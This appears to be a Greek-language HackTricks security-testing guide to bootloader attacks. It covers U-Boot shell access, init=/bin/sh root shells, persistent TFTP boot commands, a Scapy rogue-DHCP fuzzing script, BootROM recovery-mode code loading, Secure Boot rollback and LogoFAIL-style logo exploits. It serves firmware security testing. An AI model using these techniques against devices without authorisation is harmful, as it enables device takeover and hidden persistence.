# Δοκιμές Bootloader

{{#include ../../banners/hacktricks-training.md}}

Τα παρακάτω βήματα προτείνονται για την τροποποίηση των ρυθμίσεων εκκίνησης της συσκευής και τον έλεγχο bootloaders όπως U-Boot και UEFI-class loaders. Επικεντρωθείτε στο να αποκτήσετε early code execution, στην αξιολόγηση των signature/rollback protections και στην κατάχρηση των recovery ή network-boot paths.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Κατά την εκκίνηση, πατήστε ένα γνωστό break key (συχνά οποιοδήποτε πλήκτρο, 0, space, ή μια board-specific "magic" ακολουθία) πριν εκτελεστεί το `bootcmd` για να μεταβείτε στο U-Boot prompt.

2. Inspect boot state and variables
- Χρήσιμες εντολές:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Προσθέστε `init=/bin/sh` ώστε ο kernel να ανοίξει shell αντί για το κανονικό init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Διαμορφώστε το δίκτυο και φέρετε ένα kernel/fit image από το LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Εάν η αποθήκευση env δεν είναι write-protected, μπορείτε να διατηρήσετε τον έλεγχο:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν τα fallback paths. Λανθασμένες τιμές μπορούν να επιτρέψουν επανειλημμένα breaks στο shell.

6. Check debug/unsafe features
- Ψάξτε για: `bootdelay` > 0, `autoboot` disabled, ανεξέλεγκτο `usb start; fatload usb 0:1 ...`, δυνατότητα `loady`/`loads` μέσω serial, `env import` από μη αξιόπιστα μέσα, και kernels/ramdisks που φορτώνονται χωρίς έλεγχο υπογραφών.

7. U-Boot image/verification testing
- Αν η πλατφόρμα ισχυρίζεται secure/verified boot με FIT images, δοκιμάστε τόσο unsigned όσο και τροποποιημένα images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Η απουσία `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η legacy συμπεριφορά `verify=n` συχνά επιτρέπει το booting αυθαίρετων payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- Η legacy BOOTP/DHCP υλοποίηση του U-Boot έχει παρουσιάσει ζητήματα memory-safety. Για παράδειγμα, CVE‑2024‑42040 περιγράφει memory disclosure via crafted DHCP responses που μπορούν να leak bytes από τη μνήμη του U-Boot πίσω στο δίκτυο. Εφαρμόστε τα DHCP/PXE code paths με υπερβολικά μακριές/edge-case τιμές (option 67 bootfile-name, vendor options, file/servername fields) και παρατηρήστε για hangs/leaks.
- Minimal Scapy snippet για να στρεσάρετε τα boot parameters κατά το netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Επίσης επιβεβαιώστε αν τα PXE filename fields προωθούνται στη shell/loader logic χωρίς sanitization όταν συνδέονται σε OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Στήστε έναν rogue DHCP/PXE service και δοκιμάστε την έγχυση χαρακτήρων σε filename ή options fields για να φτάσετε σε command interpreters σε επόμενα στάδια της αλυσίδας εκκίνησης. Το Metasploit’s DHCP auxiliary, `dnsmasq`, ή custom Scapy scripts δουλεύουν καλά. Βεβαιωθείτε ότι απομονώνετε πρώτα το lab network.

## SoC ROM recovery modes that override normal boot

Πολλά SoC εκθέτουν ένα BootROM "loader" mode που θα δεχτεί κώδικα μέσω USB/UART ακόμη και όταν τα flash images είναι invalid. Εάν τα secure-boot fuses δεν έχουν καεί, αυτό μπορεί να παρέχει arbitrary code execution πολύ νωρίς στην αλυσίδα.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Εκτιμήστε εάν η συσκευή έχει secure-boot eFuses/OTP καμμένα. Αν όχι, τα BootROM download modes συχνά παρακάμπτουν οποιονδήποτε υψηλότερου επιπέδου έλεγχο (U-Boot, kernel, rootfs) εκτελώντας το πρώτο σας στάδιο payload κατευθείαν από SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Κάντε mount την EFI System Partition (ESP) και ελέγξτε για loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Δοκιμάστε να κάνετε boot με downgraded ή γνωστά ευάλωτα signed boot components εάν οι Secure Boot revocations (dbx) δεν είναι ενημερωμένες. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε τον δικό σας kernel ή `grub.cfg` από το ESP για persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Πολλά OEM/IBV firmwares ήταν ευάλωτα σε image-parsing flaws στο DXE που επεξεργάζονται boot logos. Εάν ένας επιτιθέμενος μπορεί να τοποθετήσει ένα crafted image στο ESP κάτω από ένα vendor-specific path (π.χ., `\EFI\<vendor>\logo\*.bmp`) και να κάνει reboot, ενδέχεται να είναι δυνατή η εκτέλεση κώδικα κατά το early boot ακόμη και με Secure Boot ενεργό. Ελέγξτε αν η πλατφόρμα αποδέχεται user-supplied logos και αν αυτά τα paths είναι writable από το OS.

## Hardware caution

Να είστε προσεκτικοί όταν αλληλεπιδράτε με SPI/NAND flash κατά το early boot (π.χ., grounding pins για να παρακάμψετε reads) και συμβουλευτείτε πάντα το flash datasheet. Λανθασμένα timed shorts μπορούν να καταστρέψουν τη συσκευή ή τον programmer.

## Notes and additional tips

- Δοκιμάστε `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μετακινήσετε environment blobs μεταξύ RAM και storage; κάποιες πλατφόρμες επιτρέπουν εισαγωγή env από removable media χωρίς authentication.
- Για persistence σε Linux-based systems που bootάρουν μέσω `extlinux.conf`, η τροποποίηση της γραμμής `APPEND` (για ένεση `init=/bin/sh` ή `rd.break`) στο boot partition είναι συχνά αρκετή όταν δεν εφαρμόζονται checks υπογραφών.
- Εάν ο userland παρέχει `fw_printenv/fw_setenv`, επαληθεύστε ότι το `/etc/fw_env.config` ταιριάζει με το πραγματικό env storage. Λανθασμένες offsets σας επιτρέπουν να διαβάσετε/γράψετε τη λάθος MTD περιοχή.

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
